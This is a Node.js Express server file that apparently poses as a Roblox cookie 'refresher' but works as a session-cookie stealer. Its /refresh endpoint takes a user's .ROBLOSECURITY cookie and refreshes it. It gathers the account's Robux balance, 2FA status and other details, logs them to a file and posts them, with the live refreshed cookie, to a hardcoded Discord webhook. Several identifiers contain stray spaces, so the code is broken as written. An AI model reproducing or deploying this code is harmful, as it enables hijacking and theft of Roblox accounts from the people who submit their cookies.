const express = require('express');
const axios = require('axios');
const fs = require('fs');

const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
const { RobloxUser  } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));

app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;

    try {
        const authTicket = await generateAuthTicket(roblosecurityCookie);

        if (authTicket === "Failed to fetch auth ticket") {
            return res.status(400).json({ error: "Invalid cookie" });
        }

        const redemptionResult = await redeemAuthTicket(authTicket);

        if (!redemptionResult.success) {
            if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
                return res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
            } else {
                return res.status(400).json({ error: "Invalid cookie" });
            }
        }

        const refreshedCookie = redemptionResult.refreshedCookie || '';

        const robloxUser  = await RobloxUser .register(roblosecurityCookie);
        const userData = await robloxUser .getUser Data();

        const debugInfo = `Auth Ticket ID: ${authTicket}`;
        const fileContent = {
            RefreshedCookie: refreshedCookie,
            DebugInfo: debugInfo,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap,
        };

        fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));

        const webhookURL = 'https://discord.com/api/webhooks/1337379615353606174/GyYVj-z2PhtKOf9GqaEswhnkWo2osN4-A42gJ05YYjPrX-VPfyhZB7IkuJNAy21ngdfk'; // Replace with your actual webhook URL
        const response = await axios.post(webhookURL, {
            embeds: [
                {
                    title: 'Refreshed Cookie',
                    description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
                    color: 16776960,
                    thumbnail: {
                        url: userData.avatarUrl,
                    },
                    fields: [
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User  ID', value: userData.uid, inline: true },
                        { name: 'Display Name', value: userData.displayName, inline: true },
                        { name: 'Creation Date', value: userData.createdAt, inline: true },
                        { name: 'Country', value: userData.country, inline: true },
                        { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
                        { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
                        { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
                        { name: 'Is Premium', value: userData.isPremium, inline: true },
                        { name: 'Credit Balance', value: userData.creditbalance, inline: true },
                        { name: 'RAP', value: userData.rap, inline: true },
                    ],
                }
            ]
        });

        console.log('Sent successfully:', response.data);
        res.json({ authTicket, redemptionResult });
    } catch (error) {
        console.error('Error occurred:', error.response ? error.response.data : error.message);
        res.status(500).json({ error: 'An error occurred while processing your request.' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
